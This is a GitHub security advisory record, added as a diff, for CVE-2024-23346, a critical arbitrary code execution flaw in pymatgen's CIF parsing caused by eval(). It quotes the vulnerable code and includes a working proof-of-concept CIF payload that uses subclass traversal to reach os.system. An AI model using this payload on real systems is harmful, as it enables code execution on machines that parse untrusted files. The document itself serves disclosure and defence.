@@ -1,0 +1,69 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-vgv8-5cpj-qj2f",
+  "modified": "2024-02-21T19:33:08Z",
+  "published": "2024-02-21T18:04:00Z",
+  "aliases": [
+    "CVE-2024-23346"
+  ],
+  "summary": "pymatgen vulnerable to arbitrary code execution when parsing a maliciously crafted JonesFaithfulTransformation transformation_string",
+  "details": "### Summary\nA critical security vulnerability exists in the `JonesFaithfulTransformation.from_transformation_str()` method within the `pymatgen` library. This method insecurely utilizes eval() for processing input, enabling execution of arbitrary code when parsing untrusted input. This can be exploited when parsing a maliciously-created CIF file.\n\n### Details\nThe cause of the vulnerability is in [pymatgen/symmetry/settings.py#L97C1-L111C108](https://github.com/materialsproject/pymatgen/blob/master/pymatgen/symmetry/settings.py#L97C1-L111C108). The flawed code segment involves a regular expression operation followed by the use of `eval()`.\n\n#### Vulnerable code\n\n```py\nbasis_change = [\n    re.sub(r\"(?<=\\w|\\))(?=\\() | (?<=\\))(?=\\w) | (?<=(\\d|a|b|c))(?=([abc]))\", r\"*\", string, flags=re.X)\n    for string in basis_change\n]\n\"\"\"snip\"\"\"\n([eval(x, {\"__builtins__\": None}, {\"a\": a, \"b\": b, \"c\": c}) for x in basis_change])\n```\n\nThe use of eval, even with `__builtins__` set to `None`, is still a security risk. The `BuiltinImporter` class can be recovered with subclass traversal.\n\n### PoC\n\nThe vulnerability can be exploited as follows:\n\nCreate a file `vuln.cif` with the following contents:\n\n```\ndata_5yOhtAoR\n_audit_creation_date            2018-06-08\n_audit_creation_method          \"Pymatgen CIF Parser Arbitrary Code Execution Exploit\"\n\nloop_\n_parent_propagation_vector.id\n_parent_propagation_vector.kxkykz\nk1 [0 0 0]\n\n_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+[\"__sub\" + \"classes__\"]) () if d.__name__ == \"BuiltinImporter\"][0].load_module (\"os\").system (\"touch pwned\");0,0,0'\n\n\n_space_group_magn.number_BNS  62.448\n_space_group_magn.name_BNS  \"P  n'  m  a'  \"\n```\n\nThen, parse the cif file with the following code:\n```py\nfrom pymatgen.io.cif import CifParser\nparser = CifParser(\"vuln.cif\")\nstructure = parser.parse_structures()\n```\n\n### Credits\n\nThis vulnerability was found and disclosed by [William Khem-Marquez](https://github.com/SteakEnthusiast).",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "pymatgen"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "2024.2.20"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-23346"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/materialsproject/pymatgen/commit/c231cbd3d5147ee920a37b6ee9dd236b376bcf5a"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/materialsproject/pymatgen"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/materialsproject/pymatgen/blob/master/pymatgen/symmetry/settings.py#L97C1-L111C108"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-77"
+    ],
+    "severity": "CRITICAL",
+    "github_reviewed": true,
+    "github_reviewed_at": "2024-02-21T18:04:00Z",
+    "nvd_published_at": "2024-02-21T17:15:09Z"
+  }
+}
